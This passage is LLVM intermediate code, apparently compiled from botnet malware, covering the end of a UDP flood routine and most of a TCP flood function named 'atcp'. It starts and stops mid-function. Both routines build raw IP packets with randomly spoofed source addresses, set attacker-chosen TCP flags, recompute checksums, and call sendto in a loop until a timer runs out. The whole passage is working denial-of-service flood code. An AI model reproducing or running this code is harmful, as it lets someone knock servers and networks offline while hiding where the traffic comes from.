  %121 = xor i32 %119, %120
  call void @srand(i32 %121) #6
  %122 = call i32 @rand() #6
  call void @init_rand(i32 %122)
  br label %114

; <label>:123:                                    ; preds = %114
  %124 = load i32, i32* %10, align 4
  %125 = icmp eq i32 %124, 0
  br i1 %125, label %126, label %127

; <label>:126:                                    ; preds = %123
  store i32 0, i32* %22, align 4
  br label %133

; <label>:127:                                    ; preds = %123
  %128 = load i32, i32* %10, align 4
  %129 = sub nsw i32 32, %128
  %130 = shl i32 1, %129
  %131 = sub nsw i32 %130, 1
  %132 = xor i32 %131, -1
  store i32 %132, i32* %22, align 4
  br label %133

; <label>:133:                                    ; preds = %127, %126
  %134 = load i32, i32* %11, align 4
  %135 = sext i32 %134 to i64
  %136 = add i64 28, %135
  %137 = call i8* @llvm.stacksave()
  store i8* %137, i8** %23, align 8
  %138 = alloca i8, i64 %136, align 16
  %139 = bitcast i8* %138 to %struct.iphdr*
  store %struct.iphdr* %139, %struct.iphdr** %24, align 8
  %140 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %141 = bitcast %struct.iphdr* %140 to i8*
  %142 = getelementptr i8, i8* %141, i64 20
  %143 = bitcast i8* %142 to %struct.udphdr*
  store %struct.udphdr* %143, %struct.udphdr** %25, align 8
  %144 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %145 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %146 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %145, i32 0, i32 0
  %147 = load i32, i32* %146, align 4
  %148 = load i32, i32* %22, align 4
  %149 = call i32 @getRandomIP(i32 %148)
  %150 = call i32 @htonl(i32 %149) #9
  %151 = load i32, i32* %11, align 4
  %152 = sext i32 %151 to i64
  %153 = add i64 8, %152
  %154 = trunc i64 %153 to i32
  call void @makeIPPacket(%struct.iphdr* %144, i32 %147, i32 %150, i8 zeroext 17, i32 %154)
  %155 = load i32, i32* %11, align 4
  %156 = sext i32 %155 to i64
  %157 = add i64 8, %156
  %158 = trunc i64 %157 to i16
  %159 = call zeroext i16 @htons(i16 zeroext %158) #9
  %160 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %161 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %160, i32 0, i32 0
  %162 = bitcast %union.anon.3* %161 to %struct.anon.4*
  %163 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %162, i32 0, i32 2
  store i16 %159, i16* %163, align 2
  %164 = call i32 @rand_cmwc()
  %165 = trunc i32 %164 to i16
  %166 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %167 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %166, i32 0, i32 0
  %168 = bitcast %union.anon.3* %167 to %struct.anon.4*
  %169 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %168, i32 0, i32 0
  store i16 %165, i16* %169, align 2
  %170 = load i32, i32* %8, align 4
  %171 = icmp eq i32 %170, 0
  br i1 %171, label %172, label %174

; <label>:172:                                    ; preds = %133
  %173 = call i32 @rand_cmwc()
  br label %179

; <label>:174:                                    ; preds = %133
  %175 = load i32, i32* %8, align 4
  %176 = trunc i32 %175 to i16
  %177 = call zeroext i16 @htons(i16 zeroext %176) #9
  %178 = zext i16 %177 to i32
  br label %179

; <label>:179:                                    ; preds = %174, %172
  %180 = phi i32 [ %173, %172 ], [ %178, %174 ]
  %181 = trunc i32 %180 to i16
  %182 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %183 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %182, i32 0, i32 0
  %184 = bitcast %union.anon.3* %183 to %struct.anon.4*
  %185 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %184, i32 0, i32 1
  store i16 %181, i16* %185, align 2
  %186 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %187 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %186, i32 0, i32 0
  %188 = bitcast %union.anon.3* %187 to %struct.anon.4*
  %189 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %188, i32 0, i32 3
  store i16 0, i16* %189, align 2
  %190 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %191 = bitcast %struct.udphdr* %190 to i8*
  %192 = getelementptr inbounds i8, i8* %191, i64 8
  %193 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %192, i32 %193)
  %194 = bitcast i8* %138 to i16*
  %195 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %196 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %195, i32 0, i32 2
  %197 = load i16, i16* %196, align 2
  %198 = zext i16 %197 to i32
  %199 = call zeroext i16 @csum(i16* %194, i32 %198)
  %200 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %201 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %200, i32 0, i32 7
  store i16 %199, i16* %201, align 2
  %202 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %203 = load i32, i32* %9, align 4
  %204 = add nsw i32 %202, %203
  store i32 %204, i32* %26, align 4
  store i32 0, i32* %27, align 4
  br label %205

; <label>:205:                                    ; preds = %258, %257, %179
  br label %206

; <label>:206:                                    ; preds = %205
  %207 = load i32, i32* %19, align 4
  %208 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %209 = call i64 @sendto(i32 %207, i8* %138, i64 %136, i32 0, %struct.sockaddr* %208, i32 16)
  %210 = call i32 @rand_cmwc()
  %211 = trunc i32 %210 to i16
  %212 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %213 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %212, i32 0, i32 0
  %214 = bitcast %union.anon.3* %213 to %struct.anon.4*
  %215 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %214, i32 0, i32 0
  store i16 %211, i16* %215, align 2
  %216 = load i32, i32* %8, align 4
  %217 = icmp eq i32 %216, 0
  br i1 %217, label %218, label %220

; <label>:218:                                    ; preds = %206
  %219 = call i32 @rand_cmwc()
  br label %225

; <label>:220:                                    ; preds = %206
  %221 = load i32, i32* %8, align 4
  %222 = trunc i32 %221 to i16
  %223 = call zeroext i16 @htons(i16 zeroext %222) #9
  %224 = zext i16 %223 to i32
  br label %225

; <label>:225:                                    ; preds = %220, %218
  %226 = phi i32 [ %219, %218 ], [ %224, %220 ]
  %227 = trunc i32 %226 to i16
  %228 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %229 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %228, i32 0, i32 0
  %230 = bitcast %union.anon.3* %229 to %struct.anon.4*
  %231 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %230, i32 0, i32 1
  store i16 %227, i16* %231, align 2
  %232 = call i32 @rand_cmwc()
  %233 = trunc i32 %232 to i16
  %234 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %235 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %234, i32 0, i32 3
  store i16 %233, i16* %235, align 4
  %236 = load i32, i32* %22, align 4
  %237 = call i32 @getRandomIP(i32 %236)
  %238 = call i32 @htonl(i32 %237) #9
  %239 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %240 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %239, i32 0, i32 8
  store i32 %238, i32* %240, align 4
  %241 = bitcast i8* %138 to i16*
  %242 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %243 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %242, i32 0, i32 2
  %244 = load i16, i16* %243, align 2
  %245 = zext i16 %244 to i32
  %246 = call zeroext i16 @csum(i16* %241, i32 %245)
  %247 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %248 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %247, i32 0, i32 7
  store i16 %246, i16* %248, align 2
  %249 = load i32, i32* %27, align 4
  %250 = load i32, i32* %14, align 4
  %251 = icmp eq i32 %249, %250
  br i1 %251, label %252, label %258

; <label>:252:                                    ; preds = %225
  %253 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %254 = load i32, i32* %26, align 4
  %255 = icmp sgt i32 %253, %254
  br i1 %255, label %256, label %257

; <label>:256:                                    ; preds = %252
  br label %261

; <label>:257:                                    ; preds = %252
  store i32 0, i32* %27, align 4
  br label %205

; <label>:258:                                    ; preds = %225
  %259 = load i32, i32* %27, align 4
  %260 = add i32 %259, 1
  store i32 %260, i32* %27, align 4
  br label %205

; <label>:261:                                    ; preds = %256
  %262 = load i8*, i8** %23, align 8
  call void @llvm.stackrestore(i8* %262)
  br label %263

; <label>:263:                                    ; preds = %261, %112, %106, %101, %64, %56, %45
  ret void
}

declare i32 @time(...) #2

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #2

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @srand(i32) #3

; Function Attrs: nounwind
declare i32 @rand() #3

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #6

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #1

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #6

; Function Attrs: noinline nounwind uwtable
define void @atcp(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %14, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %7
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %39

; <label>:34:                                     ; preds = %7
  %35 = load i32, i32* %9, align 4
  %36 = trunc i32 %35 to i16
  %37 = call zeroext i16 @htons(i16 zeroext %36) #9
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  br label %39

; <label>:39:                                     ; preds = %34, %30
  %40 = load i8*, i8** %8, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %42 = call i32 @getHost(i8* %40, %struct.in_addr* %41)
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %39
  br label %332

; <label>:45:                                     ; preds = %39
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %47 = getelementptr inbounds [8 x i8], [8 x i8]* %46, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 8, i32 4, i1 false)
  %48 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %48, i32* %17, align 4
  %49 = load i32, i32* %17, align 4
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %52, label %51

; <label>:51:                                     ; preds = %45
  br label %332

; <label>:52:                                     ; preds = %45
  store i32 1, i32* %18, align 4
  %53 = load i32, i32* %17, align 4
  %54 = bitcast i32* %18 to i8*
  %55 = call i32 @setsockopt(i32 %53, i32 0, i32 3, i8* %54, i32 4) #6
  %56 = icmp slt i32 %55, 0
  br i1 %56, label %57, label %58

; <label>:57:                                     ; preds = %52
  br label %332

; <label>:58:                                     ; preds = %52
  %59 = load i32, i32* %11, align 4
  %60 = icmp eq i32 %59, 0
  br i1 %60, label %61, label %62

; <label>:61:                                     ; preds = %58
  store i32 0, i32* %19, align 4
  br label %68

; <label>:62:                                     ; preds = %58
  %63 = load i32, i32* %11, align 4
  %64 = sub nsw i32 32, %63
  %65 = shl i32 1, %64
  %66 = sub nsw i32 %65, 1
  %67 = xor i32 %66, -1
  store i32 %67, i32* %19, align 4
  br label %68

; <label>:68:                                     ; preds = %62, %61
  %69 = load i32, i32* %13, align 4
  %70 = sext i32 %69 to i64
  %71 = add i64 40, %70
  %72 = call i8* @llvm.stacksave()
  store i8* %72, i8** %20, align 8
  %73 = alloca i8, i64 %71, align 16
  %74 = bitcast i8* %73 to %struct.iphdr*
  store %struct.iphdr* %74, %struct.iphdr** %21, align 8
  %75 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %76 = bitcast %struct.iphdr* %75 to i8*
  %77 = getelementptr i8, i8* %76, i64 20
  %78 = bitcast i8* %77 to %struct.tcphdr*
  store %struct.tcphdr* %78, %struct.tcphdr** %22, align 8
  %79 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %80 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %81 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %80, i32 0, i32 0
  %82 = load i32, i32* %81, align 4
  %83 = load i32, i32* %19, align 4
  %84 = call i32 @getRandomIP(i32 %83)
  %85 = call i32 @htonl(i32 %84) #9
  %86 = load i32, i32* %13, align 4
  %87 = sext i32 %86 to i64
  %88 = add i64 20, %87
  %89 = trunc i64 %88 to i32
  call void @makeIPPacket(%struct.iphdr* %79, i32 %82, i32 %85, i8 zeroext 6, i32 %89)
  %90 = call i32 @rand_cmwc()
  %91 = trunc i32 %90 to i16
  %92 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %93 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %92, i32 0, i32 0
  %94 = bitcast %union.anon.1* %93 to %struct.anon.2*
  %95 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %94, i32 0, i32 0
  store i16 %91, i16* %95, align 4
  %96 = call i32 @rand_cmwc()
  %97 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %98 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %97, i32 0, i32 0
  %99 = bitcast %union.anon.1* %98 to %struct.anon.2*
  %100 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %99, i32 0, i32 2
  store i32 %96, i32* %100, align 4
  %101 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %102 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %101, i32 0, i32 0
  %103 = bitcast %union.anon.1* %102 to %struct.anon.2*
  %104 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %103, i32 0, i32 3
  store i32 0, i32* %104, align 4
  %105 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %106 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %105, i32 0, i32 0
  %107 = bitcast %union.anon.1* %106 to %struct.anon.2*
  %108 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %107, i32 0, i32 4
  %109 = load i16, i16* %108, align 4
  %110 = and i16 %109, -241
  %111 = or i16 %110, 80
  store i16 %111, i16* %108, align 4
  %112 = load i8*, i8** %12, align 8
  %113 = call i32 @strcmp(i8* %112, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.4, i32 0, i32 0)) #10
  %114 = icmp ne i32 %113, 0
  br i1 %114, label %151, label %115

; <label>:115:                                    ; preds = %68
  %116 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %117 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %116, i32 0, i32 0
  %118 = bitcast %union.anon.1* %117 to %struct.anon.2*
  %119 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %118, i32 0, i32 4
  %120 = load i16, i16* %119, align 4
  %121 = and i16 %120, -513
  %122 = or i16 %121, 512
  store i16 %122, i16* %119, align 4
  %123 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %124 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %123, i32 0, i32 0
  %125 = bitcast %union.anon.1* %124 to %struct.anon.2*
  %126 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %125, i32 0, i32 4
  %127 = load i16, i16* %126, align 4
  %128 = and i16 %127, -1025
  %129 = or i16 %128, 1024
  store i16 %129, i16* %126, align 4
  %130 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %131 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %130, i32 0, i32 0
  %132 = bitcast %union.anon.1* %131 to %struct.anon.2*
  %133 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %132, i32 0, i32 4
  %134 = load i16, i16* %133, align 4
  %135 = and i16 %134, -257
  %136 = or i16 %135, 256
  store i16 %136, i16* %133, align 4
  %137 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %138 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %137, i32 0, i32 0
  %139 = bitcast %union.anon.1* %138 to %struct.anon.2*
  %140 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %139, i32 0, i32 4
  %141 = load i16, i16* %140, align 4
  %142 = and i16 %141, -4097
  %143 = or i16 %142, 4096
  store i16 %143, i16* %140, align 4
  %144 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %145 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %144, i32 0, i32 0
  %146 = bitcast %union.anon.1* %145 to %struct.anon.2*
  %147 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %146, i32 0, i32 4
  %148 = load i16, i16* %147, align 4
  %149 = and i16 %148, -2049
  %150 = or i16 %149, 2048
  store i16 %150, i16* %147, align 4
  br label %225

; <label>:151:                                    ; preds = %68
  %152 = load i8*, i8** %12, align 8
  %153 = call i8* @strtok(i8* %152, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %153, i8** %23, align 8
  br label %154

; <label>:154:                                    ; preds = %222, %151
  %155 = load i8*, i8** %23, align 8
  %156 = icmp ne i8* %155, null
  br i1 %156, label %157, label %224

; <label>:157:                                    ; preds = %154
  %158 = load i8*, i8** %23, align 8
  %159 = call i32 @strcmp(i8* %158, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.6, i32 0, i32 0)) #10
  %160 = icmp ne i32 %159, 0
  br i1 %160, label %169, label %161

; <label>:161:                                    ; preds = %157
  %162 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %163 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %162, i32 0, i32 0
  %164 = bitcast %union.anon.1* %163 to %struct.anon.2*
  %165 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %164, i32 0, i32 4
  %166 = load i16, i16* %165, align 4
  %167 = and i16 %166, -513
  %168 = or i16 %167, 512
  store i16 %168, i16* %165, align 4
  br label %222

; <label>:169:                                    ; preds = %157
  %170 = load i8*, i8** %23, align 8
  %171 = call i32 @strcmp(i8* %170, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.7, i32 0, i32 0)) #10
  %172 = icmp ne i32 %171, 0
  br i1 %172, label %181, label %173

; <label>:173:                                    ; preds = %169
  %174 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %175 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %174, i32 0, i32 0
  %176 = bitcast %union.anon.1* %175 to %struct.anon.2*
  %177 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %176, i32 0, i32 4
  %178 = load i16, i16* %177, align 4
  %179 = and i16 %178, -1025
  %180 = or i16 %179, 1024
  store i16 %180, i16* %177, align 4
  br label %221

; <label>:181:                                    ; preds = %169
  %182 = load i8*, i8** %23, align 8
  %183 = call i32 @strcmp(i8* %182, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.8, i32 0, i32 0)) #10
  %184 = icmp ne i32 %183, 0
  br i1 %184, label %193, label %185

; <label>:185:                                    ; preds = %181
  %186 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %187 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %186, i32 0, i32 0
  %188 = bitcast %union.anon.1* %187 to %struct.anon.2*
  %189 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %188, i32 0, i32 4
  %190 = load i16, i16* %189, align 4
  %191 = and i16 %190, -257
  %192 = or i16 %191, 256
  store i16 %192, i16* %189, align 4
  br label %220

; <label>:193:                                    ; preds = %181
  %194 = load i8*, i8** %23, align 8
  %195 = call i32 @strcmp(i8* %194, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.9, i32 0, i32 0)) #10
  %196 = icmp ne i32 %195, 0
  br i1 %196, label %205, label %197

; <label>:197:                                    ; preds = %193
  %198 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %199 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %198, i32 0, i32 0
  %200 = bitcast %union.anon.1* %199 to %struct.anon.2*
  %201 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %200, i32 0, i32 4
  %202 = load i16, i16* %201, align 4
  %203 = and i16 %202, -4097
  %204 = or i16 %203, 4096
  store i16 %204, i16* %201, align 4
  br label %219

; <label>:205:                                    ; preds = %193
  %206 = load i8*, i8** %23, align 8
  %207 = call i32 @strcmp(i8* %206, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.10, i32 0, i32 0)) #10
  %208 = icmp ne i32 %207, 0
  br i1 %208, label %217, label %209

; <label>:209:                                    ; preds = %205
  %210 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %211 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %210, i32 0, i32 0
  %212 = bitcast %union.anon.1* %211 to %struct.anon.2*
  %213 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %212, i32 0, i32 4
  %214 = load i16, i16* %213, align 4
  %215 = and i16 %214, -2049
  %216 = or i16 %215, 2048
  store i16 %216, i16* %213, align 4
  br label %218

; <label>:217:                                    ; preds = %205
  br label %218

; <label>:218:                                    ; preds = %217, %209
  br label %219

; <label>:219:                                    ; preds = %218, %197
  br label %220

; <label>:220:                                    ; preds = %219, %185
  br label %221

; <label>:221:                                    ; preds = %220, %173
  br label %222

; <label>:222:                                    ; preds = %221, %161
  %223 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %223, i8** %23, align 8
  br label %154

; <label>:224:                                    ; preds = %154
  br label %225

; <label>:225:                                    ; preds = %224, %115
  %226 = call i32 @rand_cmwc()
  %227 = trunc i32 %226 to i16
  %228 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %229 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %228, i32 0, i32 0
  %230 = bitcast %union.anon.1* %229 to %struct.anon.2*
  %231 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %230, i32 0, i32 5
  store i16 %227, i16* %231, align 2
  %232 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %233 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %232, i32 0, i32 0
  %234 = bitcast %union.anon.1* %233 to %struct.anon.2*
  %235 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %234, i32 0, i32 6
  store i16 0, i16* %235, align 4
  %236 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %237 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %236, i32 0, i32 0
  %238 = bitcast %union.anon.1* %237 to %struct.anon.2*
  %239 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %238, i32 0, i32 7
  store i16 0, i16* %239, align 2
  %240 = load i32, i32* %9, align 4
  %241 = icmp eq i32 %240, 0
  br i1 %241, label %242, label %244

; <label>:242:                                    ; preds = %225
  %243 = call i32 @rand_cmwc()
  br label %249

; <label>:244:                                    ; preds = %225
  %245 = load i32, i32* %9, align 4
  %246 = trunc i32 %245 to i16
  %247 = call zeroext i16 @htons(i16 zeroext %246) #9
  %248 = zext i16 %247 to i32
  br label %249

; <label>:249:                                    ; preds = %244, %242
  %250 = phi i32 [ %243, %242 ], [ %248, %244 ]
  %251 = trunc i32 %250 to i16
  %252 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %253 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %252, i32 0, i32 0
  %254 = bitcast %union.anon.1* %253 to %struct.anon.2*
  %255 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %254, i32 0, i32 1
  store i16 %251, i16* %255, align 2
  %256 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %257 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %258 = call zeroext i16 @tcpcsum(%struct.iphdr* %256, %struct.tcphdr* %257)
  %259 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %260 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %259, i32 0, i32 0
  %261 = bitcast %union.anon.1* %260 to %struct.anon.2*
  %262 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %261, i32 0, i32 6
  store i16 %258, i16* %262, align 4
  %263 = bitcast i8* %73 to i16*
  %264 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %265 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %264, i32 0, i32 2
  %266 = load i16, i16* %265, align 2
  %267 = zext i16 %266 to i32
  %268 = call zeroext i16 @csum(i16* %263, i32 %267)
  %269 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %270 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %269, i32 0, i32 7
  store i16 %268, i16* %270, align 2
  %271 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %272 = load i32, i32* %10, align 4
  %273 = add nsw i32 %271, %272
  store i32 %273, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %274

; <label>:274:                                    ; preds = %327, %326, %249
  br label %275

; <label>:275:                                    ; preds = %274
  %276 = load i32, i32* %17, align 4
  %277 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %278 = call i64 @sendto(i32 %276, i8* %73, i64 %71, i32 0, %struct.sockaddr* %277, i32 16)
  %279 = load i32, i32* %19, align 4
  %280 = call i32 @getRandomIP(i32 %279)
  %281 = call i32 @htonl(i32 %280) #9
  %282 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %283 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %282, i32 0, i32 8
  store i32 %281, i32* %283, align 4
  %284 = call i32 @rand_cmwc()
  %285 = trunc i32 %284 to i16
  %286 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %287 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %286, i32 0, i32 3
  store i16 %285, i16* %287, align 4
  %288 = call i32 @rand_cmwc()
  %289 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %290 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %289, i32 0, i32 0
  %291 = bitcast %union.anon.1* %290 to %struct.anon.2*
  %292 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %291, i32 0, i32 2
  store i32 %288, i32* %292, align 4
  %293 = call i32 @rand_cmwc()
  %294 = trunc i32 %293 to i16
  %295 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %296 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %295, i32 0, i32 0
  %297 = bitcast %union.anon.1* %296 to %struct.anon.2*
  %298 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %297, i32 0, i32 0
  store i16 %294, i16* %298, align 4
  %299 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %300 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %299, i32 0, i32 0
  %301 = bitcast %union.anon.1* %300 to %struct.anon.2*
  %302 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %301, i32 0, i32 6
  store i16 0, i16* %302, align 4
  %303 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %304 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %305 = call zeroext i16 @tcpcsum(%struct.iphdr* %303, %struct.tcphdr* %304)
  %306 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %307 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %306, i32 0, i32 0
  %308 = bitcast %union.anon.1* %307 to %struct.anon.2*
  %309 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %308, i32 0, i32 6
  store i16 %305, i16* %309, align 4
  %310 = bitcast i8* %73 to i16*
  %311 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %312 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %311, i32 0, i32 2
  %313 = load i16, i16* %312, align 2
  %314 = zext i16 %313 to i32
  %315 = call zeroext i16 @csum(i16* %310, i32 %314)
  %316 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %317 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %316, i32 0, i32 7
  store i16 %315, i16* %317, align 2
  %318 = load i32, i32* %25, align 4
  %319 = load i32, i32* %15, align 4
  %320 = icmp eq i32 %318, %319
  br i1 %320, label %321, label %327

; <label>:321:                                    ; preds = %275
